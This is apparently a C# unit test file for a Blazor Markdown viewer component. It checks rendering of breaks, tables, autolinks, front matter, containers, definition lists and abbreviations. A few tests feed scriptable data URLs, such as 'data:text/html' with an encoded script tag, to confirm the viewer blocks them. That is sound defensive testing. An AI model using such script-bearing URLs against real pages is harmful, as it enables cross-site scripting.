    // -- Soft line breaks ----------------------------------------------------

    [TestMethod]
    public void BitMarkdownViewerShouldRenderSoftBreaksAsHardBreaksWhenEnabled()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseSoftLineAsHardLine().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "line one\nline two");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        Assert.AreEqual(1, component.FindAll(".bit-mdv br").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepSoftBreaksSoftByDefault()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "line one\nline two");
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv br").Count);
    }

    // -- Rendering details ---------------------------------------------------

    [TestMethod]
    public void BitMarkdownViewerShouldAlignTableColumnsWithClassesNotInlineStyles()
    {
        var markdown = "| l | c | r |\n|:--|:-:|--:|\n| 1 | 2 | 3 |";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        var headers = component.FindAll(".bit-mdv th");

        Assert.AreEqual("bit-mdv-align-left", headers[0].GetAttribute("class"));
        Assert.AreEqual("bit-mdv-align-center", headers[1].GetAttribute("class"));
        Assert.AreEqual("bit-mdv-align-right", headers[2].GetAttribute("class"));
        // Inline styles are unusable under a strict Content-Security-Policy.
        Assert.DoesNotContain("text-align:", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldLazyLoadImages()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![a](/a.png)");
        });

        var img = component.Find(".bit-mdv img");

        Assert.AreEqual("lazy", img.GetAttribute("loading"));
        Assert.AreEqual("async", img.GetAttribute("decoding"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldAllowEmbeddedRasterImages()
    {
        const string data = "data:image/png;base64,iVBORw0KGgo=";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, $"![dot]({data})");
        });

        Assert.AreEqual(data, component.Find(".bit-mdv img").GetAttribute("src"));
    }

    [TestMethod]
    [DataRow("data:image/svg+xml,%3Csvg%3E")]
    [DataRow("data:text/html,%3Cscript%3E")]
    [DataRow("data:image/pngx,AAAA")]
    public void BitMarkdownViewerShouldBlockScriptableDataImages(string url)
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, $"![x]({url})");
        });

        Assert.IsFalse(component.Find(".bit-mdv img").HasAttribute("src"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldBlockDataUrlsInLinks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[x](data:image/png;base64,iVBORw0KGgo=)");
        });

        Assert.IsFalse(component.Find(".bit-mdv a").HasAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderAriaLabelAndTabIndex()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# x");
            parameters.Add(p => p.AriaLabel, "Release notes");
            parameters.Add(p => p.TabIndex, "0");
        });

        var root = component.Find(".bit-mdv");

        Assert.AreEqual("Release notes", root.GetAttribute("aria-label"));
        Assert.AreEqual("0", root.GetAttribute("tabindex"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldExposeTheParsedDocument()
    {
        BitMarkdownDocumentNode? parsed = null;

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# One\n\n## Two");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
            parameters.Add(p => p.OnParsed, (BitMarkdownDocumentNode d) => parsed = d);
        });

        Assert.IsNotNull(parsed);
        Assert.AreSame(parsed, component.Instance.Document);

        var headings = BitMarkdownAstHelper.Descendants(parsed).OfType<BitMarkdownHeadingNode>().ToList();

        Assert.AreEqual(2, headings.Count);
        Assert.AreEqual("one", headings[0].Id);
        Assert.AreEqual("two", headings[1].Id);
    }

    // -- CommonMark core corners --------------------------------------------

    [TestMethod]
    public void BitMarkdownViewerShouldRenderSetextHeadings()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "Title\n=====\n\nSubtitle\n--------");
        });

        var markup = component.Markup;

        Assert.Contains("<h1>Title</h1>", markup);
        Assert.Contains("<h2>Subtitle</h2>", markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderHardBreaks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "one  \ntwo\\\nthree");
        });

        Assert.AreEqual(2, component.FindAll(".bit-mdv br").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderLooseListsWithParagraphs()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "- one\n\n- two");
        });

        Assert.AreEqual(2, component.FindAll(".bit-mdv li > p").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderTightListsWithoutParagraphs()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "- one\n- two");
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv li > p").Count);
        Assert.AreEqual(2, component.FindAll(".bit-mdv li").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldStartANewListWhenTheMarkerChanges()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "- one\n* two");
        });

        Assert.AreEqual(2, component.FindAll(".bit-mdv ul").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepEscapedPunctuationLiteral()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, @"\*not emphasis\* and \[not a link\]");
        });

        var markup = component.Markup;

        Assert.DoesNotContain("<em>", markup);
        Assert.Contains("*not emphasis* and [not a link]", component.Find(".bit-mdv p").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepPipesEscapedInsideTableCells()
    {
        var markdown = "| a | b |\n|---|---|\n| x \\| y | z |";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        var cells = component.FindAll(".bit-mdv tbody td");

        Assert.AreEqual(2, cells.Count);
        Assert.AreEqual("x | y", cells[0].TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldTrimTrailingPunctuationFromAutolinks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "Go to https://bitplatform.dev, now.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        Assert.AreEqual("https://bitplatform.dev", component.Find(".bit-mdv a").GetAttribute("href"));
    }

    [TestMethod]
    [DataRow("https://en.wikipedia.org/wiki/Foo_bar_baz")]
    [DataRow("https://example.com/a_(b)")]
    [DataRow("https://example.com/a~b")]
    [DataRow("https://example.com/_a_b")]
    public void BitMarkdownViewerShouldAutolinkUrlsContainingDelimiterCharacters(string url)
    {
        // The scanner emits a token per delimiter run, so an unpaired '_' / '*' / '~' inside
        // a bare URL would otherwise reach the autolink processor as several text nodes and
        // only the first fragment would be linked.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, $"Go to {url} now.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        Assert.AreEqual(url, component.Find(".bit-mdv a").GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldEncodeSpacesInUrls()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[a](</my url>) and ![b](</my image.png>)");
        });

        Assert.AreEqual("/my%20url", component.Find(".bit-mdv a").GetAttribute("href"));
        Assert.AreEqual("/my%20image.png", component.Find(".bit-mdv img").GetAttribute("src"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotDoubleEncodeUrls()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[a](/already%20encoded)");
        });

        Assert.AreEqual("/already%20encoded", component.Find(".bit-mdv a").GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotAutolinkInsideCode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "`https://bitplatform.dev`");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv a").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldMarkExternalLinksAsSafeToOpen()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[out](https://example.com)");
        });

        var link = component.Find(".bit-mdv a");

        Assert.AreEqual("_blank", link.GetAttribute("target"));
        Assert.AreEqual("noopener noreferrer", link.GetAttribute("rel"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotNestLinksInsideLinks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[a [b](https://b.com) c](https://a.com)");
        });

        var links = component.FindAll(".bit-mdv a");

        Assert.AreEqual(1, links.Count);
        Assert.AreEqual("https://a.com", links[0].GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderCodeBlockLanguageClass()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "```csharp\nvar x = 1;\n```");
        });

        Assert.AreEqual("language-csharp", component.Find(".bit-mdv pre code").GetAttribute("class"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderNestedBlockquotes()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "> outer\n>\n> > inner");
        });

        Assert.AreEqual(2, component.FindAll(".bit-mdv blockquote").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderAngleBracketAutolinks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "<https://bitplatform.dev> and <a@b.com>");
        });

        var links = component.FindAll(".bit-mdv a");

        Assert.AreEqual(2, links.Count);
        Assert.AreEqual("https://bitplatform.dev", links[0].GetAttribute("href"));
        Assert.AreEqual("mailto:a@b.com", links[1].GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderTheEmphasisExtras()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseEmphasisExtras().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "H~2~O x^2^ ++new++ ==hot== ~~old~~");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var html = component.Find(".bit-mdv").InnerHtml;

        Assert.Contains("<sub>2</sub>", html);
        Assert.Contains("<sup>2</sup>", html);
        Assert.Contains("<ins>new</ins>", html);
        Assert.Contains("<mark>hot</mark>", html);
        // Subscript shares '~' with strikethrough, so enabling it must not cost the two-tilde form.
        Assert.Contains("<del>old</del>", html);
    }

    [TestMethod]
    [DataRow("1 + 2 = 3")]
    [DataRow("a+b and a=b")]
    public void BitMarkdownViewerShouldNotReadASinglePlusOrEqualsAsEmphasis(string markdown)
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseEmphasisExtras().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var html = component.Find(".bit-mdv").InnerHtml;

        Assert.DoesNotContain("<ins>", html);
        Assert.DoesNotContain("<mark>", html);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotReadASingleTildeAsSubscriptWithoutTheEmphasisExtras()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "H~2~O");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        var html = component.Find(".bit-mdv").InnerHtml;

        Assert.DoesNotContain("<sub>", html);
        Assert.Contains("H~2~O", html);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldEnableStrikethroughAndTheExtrasInEitherOrder()
    {
        // '~' can only belong to one delimiter processor, so registering both flavors either way
        // round has to produce one pipeline that renders both forms rather than throwing.
        var extrasFirst = new BitMarkdownPipelineBuilder().UseEmphasisExtras().UseStrikethrough().Build();
        var strikeFirst = new BitMarkdownPipelineBuilder().UseStrikethrough().UseEmphasisExtras().Build();

        foreach (var pipeline in new[] { extrasFirst, strikeFirst })
        {
            var component = RenderComponent<BitMarkdownViewer>(parameters =>
            {
                parameters.Add(p => p.Markdown, "~~old~~ and H~2~O");
                parameters.Add(p => p.Pipeline, pipeline);
            });

            var html = component.Find(".bit-mdv").InnerHtml;

            Assert.Contains("<del>old</del>", html);
            Assert.Contains("<sub>2</sub>", html);
        }
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderFrontMatterAsNothing()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseFrontMatter().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "---\ntitle: Hello\n---\n\n# Body");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var html = component.Find(".bit-mdv").InnerHtml;

        Assert.DoesNotContain("<hr", html);
        Assert.DoesNotContain("title: Hello", html);
        Assert.Contains("<h1>Body</h1>", html);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderFrontMatterAsMarkdownWithoutTheExtension()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "---\ntitle: Hello\n---\n\n# Body");
        });

        // Without the flavor the fences are ordinary Markdown, which is exactly the garbage the
        // extension exists to prevent.
        Assert.Contains("title: Hello", component.Find(".bit-mdv").InnerHtml);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldExposeTheParsedFrontMatter()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseFrontMatter().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "---\ntitle: Hello\ndraft: true\n---\n\nbody");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var frontMatter = BitMarkdownFrontMatterNode.Find(component.Instance.Document);

        Assert.IsNotNull(frontMatter);
        Assert.AreEqual("---", frontMatter.Fence);
        Assert.IsFalse(frontMatter.IsToml);
        Assert.AreEqual("title: Hello\ndraft: true", frontMatter.Text);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReadTomlFrontMatter()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseFrontMatter().Build();

        var document = pipeline.Parse("+++\ntitle = \"Hello\"\n+++\n\nbody");

        var frontMatter = BitMarkdownFrontMatterNode.Find(document);

        Assert.IsNotNull(frontMatter);
        Assert.IsTrue(frontMatter.IsToml);
        Assert.AreEqual("title = \"Hello\"", frontMatter.Text);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotTreatAnUnterminatedBlockAsFrontMatter()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseFrontMatter().Build();

        var document = pipeline.Parse("---\ntitle: Hello\n\nbody");

        Assert.IsNull(BitMarkdownFrontMatterNode.Find(document));
        Assert.IsInstanceOfType<BitMarkdownThematicBreakNode>(document.Children[0]);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldOnlyTreatTheTopOfTheDocumentAsFrontMatter()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseFrontMatter().Build();

        // A fence after any content - or nested inside a block quote - is an ordinary thematic
        // break, not a metadata block.
        Assert.IsNull(BitMarkdownFrontMatterNode.Find(pipeline.Parse("intro\n\n---\na: b\n---\n")));
        Assert.AreEqual(0, BitMarkdownAstHelper.Descendants(pipeline.Parse("> ---\n> a: b\n> ---\n"))
                                               .OfType<BitMarkdownFrontMatterNode>().Count());
    }

    [TestMethod]
    public void BitMarkdownViewerShouldStillRenderThematicBreaksWithTheFrontMatterExtension()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseFrontMatter().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "a\n\n---\n\nb");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        Assert.AreEqual(1, component.FindAll(".bit-mdv hr").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldCurlQuotesAndDashesWithSmartyPants()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseSmartyPants().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "\"Quoted\" -- 2024---2026 ... don't <<x>>");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var text = component.Find(".bit-mdv p").TextContent;

        Assert.Contains("“Quoted”", text);
        Assert.Contains("–", text);
        Assert.Contains("—", text);
        Assert.Contains("…", text);
        Assert.Contains("don’t", text);
        Assert.Contains("«x»", text);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldLeaveCodeAndUrlsAloneWithSmartyPants()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseSmartyPants().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "`a -- b ...` and [x](https://e.com/a--b...c)");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var root = component.Find(".bit-mdv");

        Assert.AreEqual("a -- b ...", root.QuerySelector("code")!.TextContent);
        Assert.AreEqual("https://e.com/a--b...c", root.QuerySelector("a")!.GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotCurlAnythingWithoutSmartyPants()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "\"Quoted\" -- ...");
        });

        Assert.AreEqual("\"Quoted\" -- ...", component.Find(".bit-mdv p").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldAddHeadingPermalinksWhenAsked()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseAutoIdentifiers(anchorLinks: true).Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "## Getting started");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var heading = component.Find(".bit-mdv h2");
        var anchor = heading.QuerySelector("a.bit-mdv-anchor");

        Assert.AreEqual("getting-started", heading.GetAttribute("id"));
        Assert.IsNotNull(anchor);
        Assert.AreEqual("#getting-started", anchor.GetAttribute("href"));
        Assert.AreEqual("Permalink to Getting started", anchor.GetAttribute("aria-label"));
        // The glyph itself is decorative; the link is named after its heading instead.
        Assert.AreEqual("true", anchor.QuerySelector("span")!.GetAttribute("aria-hidden"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotAddHeadingPermalinksByDefault()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "## Getting started");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv .bit-mdv-anchor").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotLetThePermalinkLeakIntoTheHeadingSlug()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseAutoIdentifiers(anchorLinks: true).Build();

        var document = pipeline.Parse("# One\n\n# One\n");

        var headings = BitMarkdownAstHelper.Descendants(document).OfType<BitMarkdownHeadingNode>().ToList();

        Assert.AreEqual("one", headings[0].Id);
        Assert.AreEqual("one-1", headings[1].Id);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderInlineContentWithoutBlockWrappers()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "a **bold** word");
            parameters.Add(p => p.Inline, true);
        });

        var root = component.Find(".bit-mdv");

        Assert.AreEqual("SPAN", root.TagName);
        Assert.Contains("bit-mdv-inline", root.ClassName);
        Assert.DoesNotContain("<p>", root.InnerHtml);
        Assert.Contains("<strong>bold</strong>", root.InnerHtml);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldStillRenderNonParagraphBlocksWhenInline()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "text\n\n- one\n- two");
            parameters.Add(p => p.Inline, true);
        });

        var root = component.Find(".bit-mdv");

        Assert.DoesNotContain("<p>", root.InnerHtml);
        Assert.AreEqual(2, root.QuerySelectorAll("li").Length);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderABlockRootByDefault()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "a word");
        });

        var root = component.Find(".bit-mdv");

        Assert.AreEqual("DIV", root.TagName);
        Assert.DoesNotContain("bit-mdv-inline", root.ClassName);
        Assert.Contains("<p>", root.InnerHtml);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReparseWhenInlineToggles()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "a word");
        });

        Assert.AreEqual("DIV", component.Find(".bit-mdv").TagName);

        component.Render(parameters =>
        {
            parameters.Add(p => p.Markdown, "a word");
            parameters.Add(p => p.Inline, true);
        });

        Assert.AreEqual("SPAN", component.Find(".bit-mdv").TagName);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldScrollAWideTableInsideAWrapperRatherThanTheTableItself()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "| a | b |\n|---|---|\n| 1 | 2 |");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        var wrapper = component.Find(".bit-mdv .bit-mdv-table-wrapper");

        // Scrolling a wrapper keeps the <table> a table for assistive technology, and the wrapper
        // is focusable so the overflow is reachable with the keyboard alone.
        Assert.AreEqual("region", wrapper.GetAttribute("role"));
        Assert.AreEqual("0", wrapper.GetAttribute("tabindex"));
        Assert.IsNotNull(wrapper.QuerySelector("table"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldMarkTaskListItemsWithTheirOwnClasses()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "- [x] done\n- [ ] todo");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        var root = component.Find(".bit-mdv");

        // The classes are what let the stylesheet drop the bullets without ":has()".
        Assert.Contains("contains-task-list", root.QuerySelector("ul")!.ClassName);
        Assert.AreEqual(2, root.QuerySelectorAll("li.task-list-item").Length);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotMarkOrdinaryListItemsAsTasks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "- one\n- two");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        var root = component.Find(".bit-mdv");

        Assert.AreEqual(0, root.QuerySelectorAll("li.task-list-item").Length);
        // A list with no task items carries no class at all, rather than an empty one.
        Assert.IsNull(root.QuerySelector("ul")!.GetAttribute("class"));
    }

    [TestMethod]
    public void BitMarkdownViewerAdvancedPipelineShouldCarryFrontMatterAndTheEmphasisExtras()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "---\ntitle: t\n---\n\nH~2~O and ==hot==");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        var html = component.Find(".bit-mdv").InnerHtml;

        Assert.DoesNotContain("title: t", html);
        Assert.Contains("<sub>2</sub>", html);
        Assert.Contains("<mark>hot</mark>", html);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderCustomContainers()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseContainers().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, ":::warning Read this\nBe **careful**\n:::");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var container = component.Find(".bit-mdv .markdown-container");

        Assert.Contains("markdown-container-warning", container.ClassName);
        Assert.AreEqual("Read this", container.QuerySelector(".markdown-container-title")!.TextContent);
        Assert.IsNotNull(container.QuerySelector("strong"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNestCustomContainers()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseContainers().Build();

        var document = pipeline.Parse(":::note\nouter\n\n:::tip\ninner\n:::\n\nstill outer\n:::");

        var outer = document.Children.Single() as BitMarkdownContainerNode;

        Assert.IsNotNull(outer);
        Assert.AreEqual("note", outer.Name);
        // The inner fence is balanced against its own closer, so it does not end the outer one.
        Assert.AreEqual(1, outer.Children.OfType<BitMarkdownContainerNode>().Count());
        Assert.AreEqual(2, outer.Children.OfType<BitMarkdownParagraphNode>().Count());
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotRenderContainersWithoutTheExtension()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, ":::warning\nx\n:::");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv .markdown-container").Count);
        Assert.Contains(":::warning", component.Find(".bit-mdv").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderDefinitionLists()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseDefinitionLists().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "Blazor\n: A framework.\n: Ships in .NET.\n\nC#\n: A language.");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var list = component.Find(".bit-mdv dl");

        Assert.AreEqual(2, list.QuerySelectorAll("dt").Length);
        Assert.AreEqual(3, list.QuerySelectorAll("dd").Length);
        Assert.AreEqual("Blazor", list.QuerySelectorAll("dt")[0].TextContent);
        Assert.AreEqual("A framework.", list.QuerySelectorAll("dd")[0].TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldLetADefinitionHoldSeveralBlocks()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseDefinitionLists().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "Term\n: First.\n\n    Second.\n\nAfter");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var root = component.Find(".bit-mdv");

        Assert.AreEqual(2, root.QuerySelector("dd")!.QuerySelectorAll("p").Length);
        // The trailing paragraph is outside the list, not swallowed by the last definition.
        Assert.AreEqual("After", root.QuerySelectorAll("p")[^1].TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotTurnOrdinaryProseIntoADefinitionList()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseDefinitionLists().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "a: b\n\nplain text");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv dl").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotReadAContainerFenceAsADefinitionMarker()
    {
        // ':::' has no whitespace after its first colon, so it can never open a definition -
        // which is what lets both flavors run in one pipeline.
        var pipeline = new BitMarkdownPipelineBuilder().UseContainers().UseDefinitionLists().Build();

        var document = pipeline.Parse(":::note\nx\n:::\n\nTerm\n: def");

        Assert.AreEqual(1, document.Children.OfType<BitMarkdownContainerNode>().Count());
        Assert.AreEqual(1, document.Children.OfType<BitMarkdownDefinitionListNode>().Count());
    }

    [TestMethod]
    public void BitMarkdownViewerShouldExpandAbbreviations()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseAbbreviations().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "*[HTML]: HyperText Markup Language\n\nThe HTML spec.");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var root = component.Find(".bit-mdv");
        var abbreviation = root.QuerySelector("abbr");

        Assert.IsNotNull(abbreviation);
        Assert.AreEqual("HTML", abbreviation.TextContent);
        Assert.AreEqual("HyperText Markup Language", abbreviation.GetAttribute("title"));
        // The definition line declares the term; it is not part of the document.
        Assert.DoesNotContain("*[HTML]", root.TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldOnlyExpandWholeWordAbbreviations()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseAbbreviations().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "*[HTML]: HyperText Markup Language\n\nHTMLElement and `HTML` and HTML.");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var root = component.Find(".bit-mdv");

        // Only the standalone occurrence is expanded: not the prefix of a longer identifier, and
        // not the one inside code.
        Assert.AreEqual(1, root.QuerySelectorAll("abbr").Length);
        Assert.AreEqual("HTML", root.QuerySelector("code")!.TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldPreferTheLongestAbbreviation()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseAbbreviations().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "*[HTML]: Markup\n*[HTML5]: The fifth one\n\nHTML5 came after HTML.");
            parameters.Add(p => p.Pipeline, pipeline);
        });

